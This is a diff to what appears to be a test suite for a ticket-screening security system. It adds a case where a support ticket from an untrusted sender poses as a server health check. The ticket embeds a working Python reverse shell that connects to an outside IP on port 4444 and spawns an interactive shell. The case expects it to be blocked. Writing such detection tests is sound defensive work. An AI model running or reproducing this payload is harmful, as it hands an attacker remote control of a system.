@@ -237,5 +237,32 @@ CASES = [
         "expected_verdict": "blocked",
         "expected_threat_type": "prompt_injection",
     },
+    {
+        "label": "sandbox_code_detonation_payload",
+        "description": (
+            "Ticket containing embedded Python payload attempting socket & subprocess exfiltration. "
+            "Ingestion extracts the snippet and detonates it in the Sandbox environment, scoring 95/100 MALICIOUS risk."
+        ),
+        "source_channel": "ticket",
+        "sender": "patch-installer@untrusted-support.org",
+        "raw_text": (
+            "Ticket #9482: Automated server health check script update.\n\n"
+            "Please run the attached diagnostic python script:\n\n"
+            "```python\n"
+            "import socket\n"
+            "import subprocess\n"
+            "import os\n\n"
+            "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
+            "s.connect(('185.220.101.5', 4444))\n"
+            "os.dup2(s.fileno(), 0)\n"
+            "os.dup2(s.fileno(), 1)\n"
+            "subprocess.call(['/bin/sh', '-i'])\n"
+            "```\n\n"
+            "Run script and confirm server status."
+        ),
+        "expected_verdict": "blocked",
+        "expected_threat_type": "code_detonation",
+    },
 ]
+
 
